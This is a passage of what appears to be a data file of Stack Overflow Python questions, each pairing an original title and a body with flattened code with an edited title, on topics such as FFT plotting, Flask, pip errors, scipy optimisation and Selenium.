'8b': 17}] # sample index stored as ordered dictionary sample_idx_ord_list = [] for ids in sample_idx: ids = collections.OrderedDict(sorted(ids.items())) sample_idx_ord_list.append(ids) # for haplotype file header = ['contig', 'pos', 'ref', 'alt'] # adding some suffixes ""PI"" to available sample names for item in sample_idx_ord_list: ks_update = '' for ks in item.keys(): ks_update += ks header.append(ks_update+'_PI') header.append(ks_update+'_PG_al') #final variable store the haplotype data # write the header lines first haplotype_output = '\t'.join(header) + '\n' # to store the value of parsed the line and update the ""PI"", ""PG"" value for each sample updated_line = '' # read the piped in data back to text like file matrix_df = pd.DataFrame.to_csv(matrix_df, sep='\t', index=False) matrix_df = matrix_df.rstrip('\n').split('\n') for line in matrix_df: if line.startswith('CHROM'): continue line_split = line.split('\t') chr_ = line_split[0] ref = line_split[2] alt = list(set(line_split[3:])) # remove the alleles ""N"" missing and ""ref"" from the alt-alleles alt_up = list(filter(lambda x: x!='N' and x!=ref, alt)) # if no alt alleles are found, just continue # - i.e : don't write that line in output file if len(alt_up) == 0: continue #print('\nMining data for chromosome/contig ""%s"" ' %(chr_ )) #so, we have data for CHR, POS, REF, ALT so far # now, we mine phased genotype for each sample pair (as ""PG_al"", and also add ""PI"" tag) sample_data_for_vcf = [] for ids in sample_idx_ord_list: sample_data = [] for key, val in ids.items(): sample_value = line_split[val] sample_data.append(sample_value) # now, update the phased state for each sample # also replacing the missing allele i.e ""N"" and ""-"" with ref-allele sample_data = ('|'.join(sample_data)).replace('N', ref).replace('-', ref) sample_data_for_vcf.append(str(chr_)) sample_data_for_vcf.append(sample_data) # add data for all the samples in that line, append it with former columns (chrom, pos ..) .. # and .. write it to final haplotype file sample_data_for_vcf = '\t'.join(sample_data_for_vcf) updated_line = '\t'.join(line_split[0:3]) + '\t' + ','.join(alt_up) + \ '\t' + sample_data_for_vcf + '\n' haplotype_output += updated_line del matrix_df # clear memory print('completed haplotype preparation for chromosome/contig ""%s"" ' 'in ""%s"" sec. ' %(chr_, time.time()-time02)) print('\tWorker maximum memory usage: %.2f (mb)' %(current_mem_usage())) # return the data back to the pool return pd.read_csv(io.StringIO(haplotype_output), sep='\t')''' to monitor memory '''def current_mem_usage(): return resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024.if __name__ == '__main__': main()",How to solve memory issues while multiprocessing using Pool.map()?
Python: How to plot FFT of signal with correct frequencies on x-axis?," I can plot signals I receive from a RTL-SDR with Matplotlib's plt.psd() method, which results in the following plot:The ultimate goal of what I'm trying to achieve is to retrieve the coordinates of all peaks above a certain power level, e.g., -20. As I'm receiving my signals from the time domain, I have to convert them to the frequency domain first, which is done by the code below: This code produces the following plot:What I fail to achieve is, first, to get rid of all the noise and plot only a thin line like in the psd() plot. And, second, to have the correct frequency values shown on the x-axis.So, my questions are:Am I applying the Hanning window the wrong way, or how else can I get rid of all the noise?How do I get the proper frequency values on the x-axis of my plot?[EDIT]Here is my attempt with the welch() method: Result:This way I can't get the proper values on either axis. Also, part of the center peak is missing, which I absolutely don't understand, and the plot has that annoying line that connects both ends of the signal.[EDIT 2]Based on the answer from Francois Gosselin: the following code produces the result most similar to what the mpl.psd() method produces: Now, the only thing that remains is to figure out how to get the correct frequency (in MHz) and power (in dB) values on the respective axis ...[EDIT 3]Using the code from EDIT 2 but with the following line instead of plt.semilogy(...), I get:It shouldn't be necessary to add some ""extra calculation"" to power in the plot() method, though, should it? Shouldn't the welch() method return the correct power levels already?[EDIT 4]After trying everything you wrote, I found that grabbing the frequency and power arrays returned by the plt.psd() method is the easiest solution, both to understand and to use in my code: Resulting plot:What's interesting to see is that the plt.psd() method seems to use slightly different power levels for its own plot than what I get after computing them from the returned Pxx array. The green and the red signals are the results of plotting two different signals from the same source with plt.psd(), while the blue signal was produced by providing the simple plot() method with the arrays returned from plt.psd() (Pxx divided by sample_rate and the log10 applied to the result).[small addition to EDIT 4]I just saw that dividing the values in the computed power_lvls array by 1.1 roughly puts the signal on the same power levels as the one plotted by plt.psd(): Now, what might be the reason for that? Per default, plt.psd() uses the Hanning window for which the correction value is 1.5, or so I thought...........Using the following two lines I can now also retrieve the coordinates of a number of peaks: If you compare these values with the blue signal in the plot above, you will see that they are pretty accurate. <code>  signal = []sdr = RtlSdr()sdr.sample_rate = 2.8esdr.center_freq = 434.42e6samples = sdr.read_samples(1024*1024)signal.append(samples)from scipy.fftpack import fft, fftfreqwindow = np.hanning(len(signal[0]))sig_fft = fft(signal[0]*window)power = 20*np.log10(np.abs(sig_fft))sample_freq = fftfreq(signal[0].size, sdr.sample_rate/signal[0].size)plt.figure(figsize=(9.84, 3.94))plt.plot(sample_freq, power)plt.xlabel(""Frequency (MHz)"")plt.ylabel(""Relative power (dB)"")plt.show()idx = np.argmax(np.abs(sig_fft))freq = sample_freq[idx]peak_freq = abs(freq)print(peak_freq) from scipy.signal import welchsample_freq, power = welch(signal[0], sdr.sample_rate, window=""hamming"")plt.figure(figsize=(9.84, 3.94))plt.semilogy(sample_freq, power)plt.xlabel(""Frequency (MHz)"")plt.ylabel(""Relative power (dB)"")plt.show() from scipy.signal import welchcorr = 1.5sample_freq, power = welch(signal[0], fs=sdr.sample_rate, window=""hann"", nperseg=2048, scaling=""spectrum"")sample_freq = fftshift(sample_freq)power = fftshift(power)/corrprint(sum(power))plt.figure(figsize=(9.84, 3.94))plt.semilogy(sample_freq, power)plt.xlabel(""Frequency (MHz)"")plt.ylabel(""Relative power (dB)"")plt.show() plt.plot((sample_freq+sdr.center_freq)/1e6, np.log10(power)) Pxx, freqs = plt.psd(signals[0], NFFT=2048, Fs=sdr.sample_rate/1e6, Fc=sdr.center_freq/1e6, scale_by_freq=True, color=""green"")power_lvls = 10*log10(Pxx/(sdr.sample_rate/1e6))plt.plot(freqs, power_lvls)plt.show() plt.plot(freqs, power_lvls/1.1) indexes = peakutils.peak.indexes(np.array(power_lvls), thres=0.6/max(power_lvls), min_dist=120)print(""\nX: {}\n\nY: {}\n"".format(freqs_1[indexes], np.array(power_lvls)[indexes]))",How to plot FFT of signal with correct frequencies on x-axis?
web page button to create file upload in flask," I am trying to run my Flask application from IPython. However, it fails with a SystemExit error. Running this with IPython shows the following error: <code>  from flask import Flaskapp = Flask(__name__)@app.route('/')def index(): return 'Hello, World!'if __name__ == '__main__': app.run(debug=True) SystemExit Traceback (most recent call last)<ipython-input-35-bfd7690b11d8> in <module>() 17 18 if __name__ == '__main__':---> 19 app.run(debug = True)/Users/ravinderbhatia/anaconda/lib/python2.7/site-packages/flask/app.pyc in run(self, host, port, debug, **options) 770 options.setdefault('use_debugger', self.debug) 771 try:--> 772 run_simple(host, port, self, **options) 773 finally: 774 # reset the first request information if the development server/Users/ravinderbhatia/anaconda/lib/python2.7/site-packages/werkzeug/serving.py in run_simple(hostname, port, application, use_reloader, use_debugger, use_evalex, extra_files, reloader_interval, reloader_type, threaded, processes, request_handler, static_files, passthrough_errors, ssl_context) 687 from ._reloader import run_with_reloader 688 run_with_reloader(inner, extra_files, reloader_interval,--> 689 reloader_type) 690 else: 691 inner()/Users/ravinderbhatia/anaconda/lib/python2.7/site-packages/werkzeug/_reloader.py in run_with_reloader(main_func, extra_files, interval, reloader_type) 248 reloader.run() 249 else:--> 250 sys.exit(reloader.restart_with_reloader()) 251 except KeyboardInterrupt: 252 passSystemExit: 1",Running Flask from IPython raises SystemExit
Custom weight initialization tensorflow," I'm trying to set up custom initializer to tf.layers.dense where I initialize kernel_initializer with a weight matrix I already have. This is throwing error saying ValueError: If initializer is a constant, do not specify shape.Is it a problem to assign placeholder to kernel_initializer or am I missing something? <code>  u_1 = tf.placeholder(tf.float32, [784, 784])first_layer_u = tf.layers.dense(X_, n_params, activation=None, kernel_initializer=u_1, bias_initializer=tf.keras.initializers.he_normal())",Custom weight initialization tensorflow tf.layers.dense
Simplifying an If statement with bool()," I have some code that causes Pylint to complain:The if statement can be replaced with 'var = bool(test)' (simplifiable-if-statement)`The code (with obfuscated variable names) is below. How can this be simplified so that Pylint does not throw any errors?I don't quite understand how bool() can be used for this. I know it converts any value to a Boolean value, but I don't know how it can be applied here. <code>  A = TrueB = 1C = [1]D = FalseE = Falseif A and B in C: D = Trueelse: E = Trueprint(D, E)",Simplifying an 'if' statement with bool()
Asign schema to pa.Table.from_pandas()," Im getting this error when transforming a pandas.DF to parquet using pyArrow: To find out which column is the problem I made a new df in a for loop, first with the first column and for each loop adding another column. I realized that the error is in a column of dtype: object that starts with 0s, I guess that's why pyArrow wants to convert the column to int but fails because other values are UUID Im trying to pass a schema: (not sure if this is the way to go) where schema is: df.dtypes <code>  ArrowInvalid('Error converting from Python objects to Int64: Got Python object of type str but can only handle these types: integer table = pa.Table.from_pandas(df, schema=schema, preserve_index=False)",Assign schema to pa.Table.from_pandas()
Python - Create a log file," I'm looking to create a log file for my discord bot which is built with python.I have a few set of commands which output the console through the print command, I have added a date and time to the print outputs so it can be tracked when the bot is running. However, is it easy to make it save the print outs to a file as well? That way I can make a log file to track different days and what was called for.Console Output:Screenshot_1.pngExample of a print command in my code:async def coin(ctx): I have tried looking online at some other questions but I get quite confused looking at them as there is no clear explanation as to what is happening and how I can configure it to work for my code. <code>  author = ctx.message.authorchoice = random.randint(1,2)if choice == 1: await bot.say(""Heads"") print(currentTime() + "" - Coin Requested by "" + str(author) + "" It Landed on Heads!"")elif choice == 2: await bot.say(""Tails"") print(currentTime() + "" - Coin Requested by "" + str(author) + "" It Landed on Tails!"")",Create a log file
Rand Index function," As far as I know, there is no package available for Rand Index in python while for Adjusted Rand Index you have the option of using sklearn.metrics.adjusted_rand_score(labels_true, labels_pred). I wrote the code for Rand Score and I am going to share it with others as the answer to the post. <code> ",Rand Index function (clustering performance evaluation)
Why changing start method to 'spawn' from 'fork' in Python multiprocessing does not allow me run my job?," I am able to run a background function using multiprocessing.Process with the start method fork. For some reason, I need this child process to start a new environment when running. So I set the start method to spawn via multiprocessing.set_start_method('spawn') and run the job via job.start() I get the following error: However, I do not use pickle for anything within the function that I am calling. What could I be doing wrong? Is there a general rule of thumb that I should have followed when running processes in spawn mode?FYI: I am on a machine with Ubuntu 16.04 <code>  Can't pickle <class 'module'>: attribute lookup module on builtins failed",Why changing start method to 'spawn' from 'fork' in Python multiprocessing does not allow me run my job anymore?
Optimize function parameters," Background:I'd like to solve a wide array of optimization problems such as asset weights in a portfolio, and parameters in trading strategies where the variables are passed to functions containing a bunch of other variables as well.Until now, I've been able to do these things easily in Excel using the Solver Add-In. But I think it would be much more efficient and even more widely applicable using Python. For the sake of clarity, I'm going to boil the question down to the essence of portfolio optimization.My question (short version):Here's a dataframe and a corresponding plot with asset returns.Dataframe 1: Plot 1 - Asset returnsBased on that, I would like to find the weights for the optimal portfolio with regards to risk / return (Sharpe ratio), represented by the green dot in the plot below (the red dot is the so-called minimum variance portfolio, and represents another optimization problem).Plot 2 - Efficient frontier and optimal portfolios:How can I do this with numpy or scipy?The details:The following code section contains the function returns() to build a dataframe with random returns for two assets, as well as a function pf_sharpe to calculate the Sharpe ratio of two given weights for a portfolio of the returns. Now I'd like to find the portfolio weights that optimize the Sharpe ratio. I think you could express the optimization problem as follows: What I've tried so far:I found a possible setup in the post Python Scipy Optimization.minimize using SLSQP showing maximized results. Below is what I have so far, and it addresses a central aspect of my question directly:[...]where the variables are passed to functions containing a bunch of other variables as well.As you can see, my initial challenge prevents me from even testing if my bounds and constraints will be accepted by the function optimize.minimize(). I haven't even bothered to take into consideration the fact that this is a maximization and not a minimization problem (hopefully amendable by changing the sign of the function).Attempts: Results:Attempt1 is closest to the scipy setup here, but understandably fails because neither df nor weights have been specified.Attempt2 fails with SyntaxError: positional argument follows keyword argumentAttempt3 fails with NameError: name 'weights' is not definedI was under the impression that df could freely be specified, and that x0 in optimize.minimize would be considered the variables to be tested as 'representatives' for the weights in the function specified by pf_sharpe().As you surely understand, my transition from Excel to Python in this regard has not been the easiest, and there is plenty I don't understand here. Anyway, I'm hoping some of you may offer some suggestions or clarifications!Thank you!Appendix 1 - Simulation approach:This particular portfolio optimization problem can easily be solved by simulating a bunch of portfolio weights. And I did exactly that to produce the portfolio plot above. Here's the whole function if anyone is interested: Appendix 2 - Excel Solver approach:Here is how I would approach the problem using Excel Solver. Instead of linking to a file, I've only attached a screenshot and included the most important formulas in a code section. I'm guessing not many of you is going to be interested in reproducing this anyway. But I've included it just to show that it can be done quite easily in Excel.Grey ranges represent formulas. Ranges that can be changed and used as arguments in the optimization problem are highlighted in yellow. The green range is the objective function.Here's an image of the worksheet and Solver setup:Excel formulas: End notes:As you can see from the screenshot, Excel solver suggests a 47% / 53% split between A1 and A2 to obtain an optimal Sharpe Ratio of 5,6. Running the Python function sr_opt = portfolioSim(df = df_returns, simRuns = 25000) yields a Sharpe Ratio of 5,3 with corresponding weights of 46% and 53% for A1 and A2: The method applied in Excel is GRG Nonlinear. I understand that changing the SLSQP argument to a non-linear method would get me somewhere, and I've look into Nonlinear solvers in scipy as well, but with little success.And maybe Scipy even isn't the best option here? <code>  A1 A22017-01-01 0.0075 0.00962017-01-02 -0.0075 -0.0033..2017-01-10 0.0027 0.0035 # importsimport pandas as pdimport numpy as npfrom scipy.optimize import minimizeimport matplotlib.pyplot as pltnp.random.seed(1234)# Reproducible data sampledef returns(rows, names): ''' Function to create data sample with random returns Parameters ========== rows : number of rows in the dataframe names: list of names to represent assets Example ======= >>> returns(rows = 2, names = ['A', 'B']) A B 2017-01-01 0.0027 0.0075 2017-01-02 -0.0050 -0.0024 ''' listVars= names rng = pd.date_range('1/1/2017', periods=rows, freq='D') df_temp = pd.DataFrame(np.random.randint(-100,100,size=(rows, len(listVars))), columns=listVars) df_temp = df_temp.set_index(rng) df_temp = df_temp / 10000 return df_temp# Sharpe ratiodef pf_sharpe(df, w1, w2): ''' Function to calculate risk / reward ratio based on a pandas dataframe with two return series Parameters ========== df : pandas dataframe w1 : portfolio weight for asset 1 w2 : portfolio weight for asset 2 ''' weights = [w1,w2] # Calculate portfolio returns and volatility pf_returns = (np.sum(df.mean() * weights) * 252) pf_volatility = (np.sqrt(np.dot(np.asarray(weights).T, np.dot(df.cov() * 252, weights)))) # Calculate sharpe ratio pf_sharpe = pf_returns / pf_volatility return pf_sharpe# Make df with random returns and calculate# sharpe ratio for a 80/20 split between assetsdf_returns = returns(rows = 10, names = ['A1', 'A2'])df_returns.plot(kind = 'bar')sharpe = pf_sharpe(df = df_returns, w1 = 0.8, w2 = 0.2)print(sharpe)# Output:# 5.09477512073 maximize: pf_sharpe()by changing: w1, w2under the constraints: 0 < w1 < 1 0 < w2 < 1 w1 + w2 = 1 # boundsb = (0,1)bnds = (b,b)# constraintsdef constraint1(w1,w2): return w1 - w2cons = ({'type': 'eq', 'fun':constraint1})# initial guessx0 = [0.5, 0.5]# Testing the initial guessprint(pf_sharpe(df = df_returns, weights = x0))# Optimization attemptsattempt1 = optimize.minimize(pf_sharpe(), x0, method = 'SLSQP', bounds = bnds, constraints = cons)attempt2 = optimize.minimize(pf_sharpe(df = df_returns, weights), x0, method = 'SLSQP', bounds = bnds, constraints = cons)attempt3 = optimize.minimize(pf_sharpe(weights, df = df_returns), x0, method = 'SLSQP', bounds = bnds, constraints = cons) # Portfolio simulationdef portfolioSim(df, simRuns): ''' Function to take a df with asset returns, runs a number of simulated portfolio weights, plots return and risk for those weights, and finds minimum risk portfolio and max risk / return portfolio Parameters ========== df : pandas dataframe with returns simRuns : number of simulations ''' prets = [] pvols = [] pwgts = [] names = list(df_returns) for p in range (simRuns): # Assign random weights weights = np.random.random(len(list(df_returns))) weights /= np.sum(weights) weights = np.asarray(weights) # Calculate risk and returns with random weights prets.append(np.sum(df_returns.mean() * weights) * 252) pvols.append(np.sqrt(np.dot(weights.T, np.dot(df_returns.cov() * 252, weights)))) pwgts.append(weights) prets = np.array(prets) pvols = np.array(pvols) pwgts = np.array(pwgts) pshrp = prets / pvols # Store calculations in a df df1 = pd.DataFrame({'return':prets}) df2 = pd.DataFrame({'risk':pvols}) df3 = pd.DataFrame(pwgts) df3.columns = names df4 = pd.DataFrame({'sharpe':pshrp}) df_temp = pd.concat([df1, df2, df3, df4], axis = 1) # Plot resulst plt.figure(figsize=(8, 4)) plt.scatter(pvols, prets, c=prets / pvols, cmap = 'viridis', marker='o') # Min risk min_vol_port = df_temp.iloc[df_temp['risk'].idxmin()] plt.plot([min_vol_port['risk']], [min_vol_port['return']], marker='o', markersize=12, color=""red"") # Max sharpe max_sharpe_port = df_temp.iloc[df_temp['sharpe'].idxmax()] plt.plot([max_sharpe_port['risk']], [max_sharpe_port['return']], marker='o', markersize=12, color=""green"")# Test runportfolioSim(df = df_returns, simRuns = 250) C3 =AVERAGE(C7:C16)C4 =AVERAGE(D7:D16)H4 =COVARIANCE.P(C7:C16;D7:D16)G5 =COVARIANCE.P(C7:C16;D7:D16)G10 =G8+G9G13 =MMULT(TRANSPOSE(G8:G9);C3:C4)G14 =SQRT(MMULT(TRANSPOSE(G8:G9);MMULT(G4:H5;G8:G9)))H13 =G12/G13H14 =G13*252G16 =G13/G14H16 =H13/H14 print(sr_opt)#Output#return 0.361439#risk 0.067851#A1 0.465550#A2 0.534450#sharpe 5.326933",Python: How to optimize function parameters?
"pip install fails for every package (""Could not find a version that satisfies the requirement"")"," pip install <package name> is failing for every package for me. This is what I get: I saw similar questions on Stack Overflow, but they don't seem to be fully related to this one.Also, this post suggests that this might happen if PyPI is down or my IP address is blacklisted. It seems both are not true for my case.pip shows up-to-date on running pip install --upgrade pip. <code>  Could not find a version that satisfies the requirement <package-name(from versions: )No matching distribution found for <package-name>","'pip install' fails for every package (""Could not find a version that satisfies the requirement"")"
Python pip3 - cannot import name 'main'," Whenever I am trying to install any package using pip, I am getting this import error: It was working fine earlier, I am not sure why it is throwing this error.I have searched about this error, but can't find anything to fix it.Please let me know if you need any further detail, I will update my question. <code>  guru@guru-notebook:~$ pip3 install numpyTraceback (most recent call last): File ""/usr/bin/pip3"", line 9, in <module> from pip import mainImportError: cannot import name 'main' guru@guru-notebook:~$ cat `which pip3`#!/usr/bin/python3# GENERATED BY DEBIANimport sys# Run the main entry point, similarly to how setuptools does it, but because# we didn't install the actual entry point from setup.py, don't use the# pkg_resources API.from pip import mainif __name__ == '__main__': sys.exit(main())",Error after upgrading pip: cannot import name 'main'
Python pip3 - cannot import name 'main' error after upgrading pip," Whenever I am trying to install any package using pip, I am getting this import error: It was working fine earlier, I am not sure why it is throwing this error.I have searched about this error, but can't find anything to fix it.Please let me know if you need any further detail, I will update my question. <code>  guru@guru-notebook:~$ pip3 install numpyTraceback (most recent call last): File ""/usr/bin/pip3"", line 9, in <module> from pip import mainImportError: cannot import name 'main' guru@guru-notebook:~$ cat `which pip3`#!/usr/bin/python3# GENERATED BY DEBIANimport sys# Run the main entry point, similarly to how setuptools does it, but because# we didn't install the actual entry point from setup.py, don't use the# pkg_resources API.from pip import mainif __name__ == '__main__': sys.exit(main())",Error after upgrading pip: cannot import name 'main'
get-pip.py broken on win 10 -," Get Pip (Python file from Pypa.io) on Windows 10 is not extracting on my laptop. I followed all the instructions on pypa.io - Installing, however, when I tried to execute the file, despite many attempts to fix this, it says: So I ran C:\Python27\python.exe -m pip and then it shows another error message: I then consulted with a friend of mine, and he said that the second error message is obviously not a file error, but (me reflecting now) is quite logical. Of course it says that there is no module named pip because that was the very thing that I am trying to download. Then it occurred to me that Python must think that I already have it because it is asking me to modify pip. So I looked into this and saw that I had a pip folder but nothing inside it to do with Python. So this made me think Why is it not downloading?or Why does it think that I already have it?UPDATEThe Python installer now comes with an option to install pip which should solve any further problems! <code>  ERROR: To modify pip, please run the following command: C:\Python27\python.exe -m pip C:\Python27\python.exe: No module named pip ",get-pip.py broken on Windows 10
running mypy on all python files of a project, How can I run mypy on all .py files in a project? I have seen I can specify a module to run mypy on but not something to specify a file mask or something like this. <code> ,Run mypy on all Python files of a project
`numpy.product(array)` vs `numpy.prod(array)` vs `ndarray.prod()`," I'm reading through the Numpy docs, and it appears that the functions np.prod(...), np.product(...) and the ndarray method a.prod(...) are all equivalent. Is there a preferred version to use, both in terms of style/readability and performance? Are there different situations where different versions are preferable? If not, why are there three separate but very similar ways to perform the same operation? <code> ",numpy.product vs numpy.prod vs ndarray.prod
What is difference between plot and iplot in pandas?, What is the difference between plot() and iplot() in displaying a figure in Jupyter Notebook? <code> ,What is difference between plot and iplot in Pandas?
Selenium Python Unable to type the browser information after I updated my geckodriver and firefox," I'm having issues running my automation test scripts. When I run my script, a browser will appear but it will not type the URL and waits for 10 seconds until it throws an exception. Is there any solutions I can use so then I can get my automation test scripts to work?Geckodriver.log: Stack Traces: Code: Specs: Ubuntu 16.04 geckodriver 0.20.1 firefox 59.0.2+build1-0ubuntu0.16.04.3 Python 3.6 Pycharm 2016.3 Selenium 3.11.0 <code>  1523997052492 geckodriver INFO geckodriver 0.20.11523997052531 geckodriver INFO Listening on 127.0.0.1:378071523997052592 mozrunner::runner INFO Running command: ""/usr/bin/firefox/firefox"" ""-marionette"" ""--headless"" ""-profile"" ""/tmp/rust_mozprofile.PU1cngaAJ5Tg""1523997054831 Marionette INFO Listening on port 2828 ErrorTraceback (most recent call last):File ""/home/kavin/PycharmProjects/untitled/Testing/purchaseAmazonItems.py"", line 13, in setUpself.driver = webdriver.Firefox(firefox_binary=binary, firefox_options=opts)File ""/usr/local/lib/python3.6/dist-packages/selenium/webdriver/firefox/webdriver.py"", line 162, in __init__keep_alive=True)File ""/usr/local/lib/python3.6/dist-packages/selenium/webdriver/remote/webdriver.py"", line 154, in __init__self.start_session(desired_capabilities, browser_profile)File ""/usr/local/lib/python3.6/dist-packages/selenium/webdriver/remote/webdriver.py"", line 243, in start_sessionresponse = self.execute(Command.NEW_SESSION, parameters)File ""/usr/local/lib/python3.6/dist-packages/selenium/webdriver/remote/webdriver.py"", line 312, in executeself.error_handler.check_response(response)File ""/usr/local/lib/python3.6/dist-packages/selenium/webdriver/remote/errorhandler.py"", line 242, in check_responseraise exception_class(message, screen, stacktrace)selenium.common.exceptions.WebDriverException: Message: connection refused def setUp(self): binary = FirefoxBinary('/usr/bin/firefox/firefox') opts = FirefoxOptions() opts.add_argument(""--headless"") self.driver = webdriver.Firefox(firefox_binary=binary, firefox_options=opts) driver = self.driver driver.get('https://www.amazon.com/')",Selenium Python selenium.common.exceptions.WebDriverException: Message: connection refused using geckodriver and firefox
Selenium Python Unable to type the browser URL after I updated my geckodriver and firefox," I'm having issues running my automation test scripts. When I run my script, a browser will appear but it will not type the URL and waits for 10 seconds until it throws an exception. Is there any solutions I can use so then I can get my automation test scripts to work?Geckodriver.log: Stack Traces: Code: Specs: Ubuntu 16.04 geckodriver 0.20.1 firefox 59.0.2+build1-0ubuntu0.16.04.3 Python 3.6 Pycharm 2016.3 Selenium 3.11.0 <code>  1523997052492 geckodriver INFO geckodriver 0.20.11523997052531 geckodriver INFO Listening on 127.0.0.1:378071523997052592 mozrunner::runner INFO Running command: ""/usr/bin/firefox/firefox"" ""-marionette"" ""--headless"" ""-profile"" ""/tmp/rust_mozprofile.PU1cngaAJ5Tg""1523997054831 Marionette INFO Listening on port 2828 ErrorTraceback (most recent call last):File ""/home/kavin/PycharmProjects/untitled/Testing/purchaseAmazonItems.py"", line 13, in setUpself.driver = webdriver.Firefox(firefox_binary=binary, firefox_options=opts)File ""/usr/local/lib/python3.6/dist-packages/selenium/webdriver/firefox/webdriver.py"", line 162, in __init__keep_alive=True)File ""/usr/local/lib/python3.6/dist-packages/selenium/webdriver/remote/webdriver.py"", line 154, in __init__self.start_session(desired_capabilities, browser_profile)File ""/usr/local/lib/python3.6/dist-packages/selenium/webdriver/remote/webdriver.py"", line 243, in start_sessionresponse = self.execute(Command.NEW_SESSION, parameters)File ""/usr/local/lib/python3.6/dist-packages/selenium/webdriver/remote/webdriver.py"", line 312, in executeself.error_handler.check_response(response)File ""/usr/local/lib/python3.6/dist-packages/selenium/webdriver/remote/errorhandler.py"", line 242, in check_responseraise exception_class(message, screen, stacktrace)selenium.common.exceptions.WebDriverException: Message: connection refused def setUp(self): binary = FirefoxBinary('/usr/bin/firefox/firefox') opts = FirefoxOptions() opts.add_argument(""--headless"") self.driver = webdriver.Firefox(firefox_binary=binary, firefox_options=opts) driver = self.driver driver.get('https://www.amazon.com/')",Selenium Python selenium.common.exceptions.WebDriverException: Message: connection refused using geckodriver and firefox
Show categorical x-axis values when plotting pandas Series in matplotlib," How do I get the x-axis values of [a, b, c] to show up?  <code>  import pandas as pdimport matplotlib.pyplot as plts = pd.Series([1, 2, 10], index=['a', 'b', 'c'])s.plot()plt.show()",Show categorical x-axis values when making line plot from pandas Series in matplotlib
Python Selenium: Can't find ellement by xpath when browser is headless," I'm attempting to log into a website using Python Selenium using the following code: It works perfectly, however when I add the --headless option to the browser, it raises a NoSuchElementException. Error raising code: Traceback: This error only occurs when the browser is headless. What's causing this behavior? Can it be made to work in headless mode?target HTML: <code>  import timefrom contextlib import contextmanagerfrom selenium import webdriverfrom selenium.webdriver.chrome.options import Options@contextmanagerdef getBrowser(*options): chrome_options = Options() if options: [chrome_options.add_argument(option) for option in options] browser = webdriver.Chrome(chrome_options=chrome_options) try: yield browser finally: browser.quit()with getBrowser() as browser: browser.get('https://www.vinted.com/members/notifications') time.sleep(20) browser.find_element_by_xpath('//*[@id=""content""]/div/div[2]/div/div/div[6]/div[3]/div[3]/a/span').click() with getBrowser('--headless') as browser: browser.get('https://www.vinted.com/members/notifications') time.sleep(20) browser.find_element_by_xpath('//*[@id=""content""]/div/div[2]/div/div/div[6]/div[3]/div[3]/a/span').click() Traceback (most recent call last): File ""<ipython-input-4-fe0834deb137>"", line 1, in <module> runfile('C:/Users/Alec/vinted test case.py', wdir='C:/Users/Alec') File ""C:\Users\Alec\Anaconda3\lib\site-packages\spyder\utils\site\sitecustomize.py"", line 705, in runfile execfile(filename, namespace) File ""C:\Users\Alec\Anaconda3\lib\site-packages\spyder\utils\site\sitecustomize.py"", line 102, in execfile exec(compile(f.read(), filename, 'exec'), namespace) File ""C:/Users/Alec/vinted test case.py"", line 27, in <module> browser.find_element_by_xpath('//*[@id=""content""]/div/div[2]/div/div/div[6]/div[3]/div[3]/a/span').click() File ""C:\Users\Alec\selenium\webdriver\remote\webdriver.py"", line 354, in find_element_by_xpath return self.find_element(by=By.XPATH, value=xpath) File ""C:\Users\Alec\selenium\webdriver\remote\webdriver.py"", line 832, in find_element 'value': value})['value'] File ""C:\Users\Alec\selenium\webdriver\remote\webdriver.py"", line 297, in execute self.error_handler.check_response(response) File ""C:\Users\Alec\selenium\webdriver\remote\errorhandler.py"", line 194, in check_response raise exception_class(message, screen, stacktrace)NoSuchElementException: no such element: Unable to locate element: {""method"":""xpath"",""selector"":""//*[@id=""content""]/div/div[2]/div/div/div[6]/div[3]/div[3]/a/span""} (Session info: headless chrome=65.0.3325.181) (Driver info: chromedriver=2.36.540470 (e522d04694c7ebea4ba8821272dbef4f9b818c91),platform=Windows NT 10.0.16299 x86_64) <div class=""u-flex-grow""> <a class=""c-button--inverse c-button--normal c-button--amplified c-button "" href=""/member/general/login?ref_url=%2Fmembers%2Fnotifications""><span class=""c-button__content"">Log In</span></a> </div>",Python Selenium: Can't find element by xpath when browser is headless
Python3 - How to use specific error messages in your code?," I am new to python and I am about to make this new program that will ask you for your birthday. I've made some try/except clauses to avoid people entering info in strings or to high numbers. I would like my program to find out if the info entered equals a date in the end. If it does I would like to have it printed and if not I would like it to find out what part of the user input was wrong. I have therefore made some if clauses in the last except clause with the idea that the errors would equal a message.I would like to know if it is possible to make the program match the messages with the error to find out the specific error and figure out what part of the input was wrong.My code looks like this: <code>  try: print(datetime.date(int(birthYear), int(birthMonth), int(birthDay)))except TypeError: if ValueError == ""ValueError: month must be in 1..12"": print(""Month "" + str(birthMonth) + "" is out of range. The month must be a number in 1...12"") if ValueError == ""ValueError: year "" + str(birthYear) + "" is out of range"": print(""Year "" + str(birthMonth) + "" is out of range. The year must be a number in "" + str(datetime.MINYEAR) + ""..."" + str(datetime.MAXYEAR)) if ValueError == ""ValueError: day is out of range for month"": print(""Day "" + str(birthDay) + "" is out of range. The day must be a number in 1..."" + str(calendar.monthrange(birthYear, birthMonth)))",Catching specific error messages in try / except
python dataframe...mapping several values into one," Apologies if this has been asked before, but I looked extensively without results. I'd like to create a new column b that maps several values of a according to some rule, say a=[1,2,3] is 1, a = [4,5,6,7] is 2, a = [8,9,10] is 3. one-to-one mapping is clear to me, but what if I want to map by a list of values or a range?I tought along these lines... <code>  import pandas as pd import numpy as np df = pd.DataFrame(data = np.random.randint(1,10,10),columns=['a']) a0 71 82 83 34 15 16 27 88 69 6 df['b'] = df['a'].map({[1,2,3]:1,range(4,7):2,[8,9,10]:3})",Mapping ranges of values in pandas dataframe
getting percentage and count Pyhton," Suppoose df.bun (df is a Pandas dataframe)is a multi-index(date and name) with variable being category values written in string, How can I make this to represent total counts in the same date and its percentage to make table like below with each of its date, I have done print(df.groupby('bun').count()) as a resort to this question but it lacks..cf) Before getting df.bun I used the following code to import nested dictionary to Pandas dataframe. <code>  date name values20170331 A122630 stock-a A123320 stock-a A152500 stock-b A167860 bond A196030 stock-a A196220 stock-a A204420 stock-a A204450 curncy-US A204480 raw-material A219900 stock-a date variable counts Percentage20170331 stock 7 70% bond 1 10% raw-material 1 10% curncy 1 10% import numpy as npimport pandas as pdresult = pd.DataFrame()origDict = np.load(""Hannah Lee.npy"")for item in range(len(origDict)): newdict = {(k1, k2):v2 for k1,v1 in origDict[item].items() for k2,v2 in origDict[item][k1].items()} df = pd.DataFrame([newdict[i] for i in sorted(newdict)], index=pd.MultiIndex.from_tuples([i for i in sorted(newdict.keys())])) print(df.bun)",getting percentage and count Python
